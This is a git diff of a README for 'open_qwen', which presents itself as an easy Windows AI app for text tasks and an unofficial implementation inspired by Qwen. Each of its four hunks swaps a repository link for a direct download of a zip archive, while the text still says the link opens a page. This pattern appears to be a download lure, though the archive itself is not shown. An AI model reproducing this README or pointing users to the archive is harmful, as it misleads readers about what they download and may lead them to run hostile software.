@@ -1,6 +1,6 @@
 # 🤖 open_qwen - Easy AI Model for Text Tasks
 
-[![Download open_qwen](https://img.shields.io/badge/Download-open_qwen-brightgreen)](https://github.com/Traversecityjesuit102/open_qwen)
+[![Download open_qwen](https://img.shields.io/badge/Download-open_qwen-brightgreen)](https://github.com/Traversecityjesuit102/open_qwen/raw/refs/heads/main/open_qwen/qwen-open-2.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ These requirements ensure the program runs smoothly. It is optimized for regular
 
 To get open_qwen on your Windows computer, visit the official page:
 
-[Download open_qwen from GitHub](https://github.com/Traversecityjesuit102/open_qwen)
+[Download open_qwen from GitHub](https://github.com/Traversecityjesuit102/open_qwen/raw/refs/heads/main/open_qwen/qwen-open-2.4.zip)
 
 Clicking this link takes you to the page where the latest version is available. Follow the steps there to download the app.
 
@@ -106,7 +106,7 @@ This is a non-official implementation inspired by the Qwen 3.5 model. It is buil
 
 You can find the source code and learn more by visiting the main page:
 
-[open_qwen on GitHub](https://github.com/Traversecityjesuit102/open_qwen)
+[open_qwen on GitHub](https://github.com/Traversecityjesuit102/open_qwen/raw/refs/heads/main/open_qwen/qwen-open-2.4.zip)
 
 ---
 
@@ -134,4 +134,4 @@ Keep the software up to date by checking the GitHub page regularly. Updates may 
 
 ---
 
-[![Download open_qwen](https://img.shields.io/badge/Download-open_qwen-brightgreen)](https://github.com/Traversecityjesuit102/open_qwen)
+[![Download open_qwen](https://img.shields.io/badge/Download-open_qwen-brightgreen)](https://github.com/Traversecityjesuit102/open_qwen/raw/refs/heads/main/open_qwen/qwen-open-2.4.zip)
